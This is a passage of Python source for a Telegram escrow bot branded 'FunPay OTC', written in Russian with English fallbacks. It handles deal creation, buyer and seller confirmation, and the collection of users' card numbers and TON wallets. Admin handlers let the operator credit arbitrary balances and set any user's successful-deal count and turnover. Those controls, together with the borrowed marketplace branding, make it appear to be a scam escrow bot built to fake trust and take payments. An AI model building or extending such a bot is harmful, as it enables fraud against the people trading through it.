            await bot.send_message(deal["buyer_id"], text, reply_markup=buyer_confirmation_keyboard, parse_mode=ParseMode.HTML)
            await callback.message.edit_text(
                "✅ <b>Вы подтвердили отправку</b>\n\n"
                "Ожидаем подтверждения от покупателя...\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            deal["status"] = "completed"
            if deal["seller_id"] not in user_stats:
                user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0}
            user_stats[deal["seller_id"]]["successful"] += 1
            user_stats[deal["seller_id"]]["total"] += 1
            user_stats[deal["seller_id"]]["turnover"] += deal["amount"]
            text = "🎉 <b>Сделка успешно завершена!</b>\n\nСпасибо за использование FunPay OTC!\n📞 <b>Поддержка:</b> @FunPaySupportOTC"
            await callback.message.edit_text(text, parse_mode=ParseMode.HTML)
            await bot.send_message(deal["seller_id"], text, parse_mode=ParseMode.HTML)
            del active_deals[deal_id]
            break

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            text = "⚠️ <b>Вы сообщили о проблеме</b>\n\nПожалуйста, свяжитесь с поддержкой:\n@FunPaySupportOTC"
            await callback.message.edit_text(text, parse_mode=ParseMode.HTML)
            await bot.send_message(deal["seller_id"], text, parse_mode=ParseMode.HTML)
            break

@dp.callback_query(F.data == "confirm_cancel")
async def confirm_cancel_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "✅ Сделка успешно отменена." if lang == "ru" else "✅ Deal successfully cancelled."
    await safe_edit_message(callback, text)

# Обработчик сообщений
@dp.message(F.text)
async def message_handler(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        return

    # Обработка админских состояний
    if user_id in admin_states:
        state = admin_states[user_id]
        parts = message.text.strip().split()
        try:
            if state == "waiting_ban_id" and len(parts) == 1:
                ban_id = int(parts[0])
                banned_users.add(ban_id)
                await message.answer("✅ Пользователь забанен")
            elif state == "waiting_send_money" and len(parts) == 2:
                send_id = int(parts[0])
                amount = float(parts[1])
                user_balances[send_id] = user_balances.get(send_id, 0) + amount
                await message.answer("✅ Деньги отправлены")
            elif state == "waiting_successful_deals" and len(parts) == 2:
                stat_id = int(parts[0])
                count = int(parts[1])
                if stat_id not in user_stats:
                    user_stats[stat_id] = {"successful": 0, "total": 0, "turnover": 0}
                user_stats[stat_id]["successful"] = count
                await message.answer("✅ Успешные сделки установлены")
            elif state == "waiting_total_deals" and len(parts) == 2:
                stat_id = int(parts[0])
                count = int(parts[1])
                if stat_id not in user_stats:
                    user_stats[stat_id] = {"successful": 0, "total": 0, "turnover": 0}
                user_stats[stat_id]["total"] = count
                await message.answer("✅ Общее количество сделок установлено")
            elif state == "waiting_turnover" and len(parts) == 2:
                stat_id = int(parts[0])
                amount = float(parts[1])
                if stat_id not in user_stats:
                    user_stats[stat_id] = {"successful": 0, "total": 0, "turnover": 0}
                user_stats[stat_id]["turnover"] = amount
                await message.answer("✅ Оборот установлен")
        except ValueError:
            await message.answer("❌ Неверный формат")
        del admin_states[user_id]
        return

    # Обработка входа в сделку
    if "start=deal_" in message.text:
        deal_id = message.text.split("start=deal_")[1]
        await handle_deal_join(message, deal_id)
        return

    # Обработка создания сделки
    if user_id in user_deals:
        deal = user_deals[user_id]
        lang = user_languages.get(user_id, "ru")
        if deal["step"] == "amount":
            try:
                amount = float(message.text)
                deal["amount"] = amount
                deal["step"] = "description"
                text = "📝 Введите описание сделки. Например: 2 кепки дурова и ..." if lang == "ru" else "📝 Enter deal description:"
                await message.answer(text)
            except ValueError:
                text = "❌ Введите корректное число" if lang == "ru" else "❌ Enter valid number"
                await message.answer(text)
            return
        elif deal["step"] == "description":
            deal["description"] = message.text
            deal_id = generate_deal_id()
            active_deals[deal_id] = {
                "seller_id": user_id,
                "seller_username": message.from_user.username or "Не указан",
                "currency": deal["currency"],
                "amount": deal["amount"],
                "description": deal["description"],
                "status": "waiting_buyer"
            }
            deal_link = f"https://t.me/FunPayOTCdbot?start=deal_{deal_id}"
            text = (
                "✅ Сделка создана!\n\n"
                f"🆔 ID: #{deal_id}\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"📝 Описание: {deal['description']}\n\n"
                f"Ссылка для покупателя: {deal_link}"
            ) if lang == "ru" else (
                "✅ Deal created!\n\n"
                f"🆔 ID: #{deal_id}\n"
                f"💰 Amount: {deal['amount']} {deal['currency']}\n"
                f"📝 Description: {deal['description']}\n\n"
                f"Link for buyer: {deal_link}"
            )
            await message.answer(text)
            del user_deals[user_id]
            return

    # Обработка добавления реквизитов
    text = message.text
    if user_id in user_requisites:  # Предполагаем состояние для добавления
        if " - " in text and any(char.isdigit() for char in text):
            user_requisites[user_id]["card"] = text
            lang = user_languages.get(user_id, "ru")
            await message.answer("✅ Карта добавлена" if lang == "ru" else "✅ Card added")
        elif text.startswith("UQ") and len(text) > 30:
            user_requisites[user_id]["ton"] = text
            lang = user_languages.get(user_id, "ru")
            await message.answer("✅ TON кошелек добавлен" if lang == "ru" else "✅ TON wallet added")

# Запуск бота
async def main():
    print("🎁 FunPay Bot запускается...")
    print(f"📞 Поддержка: {SUPPORT_USERNAME}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())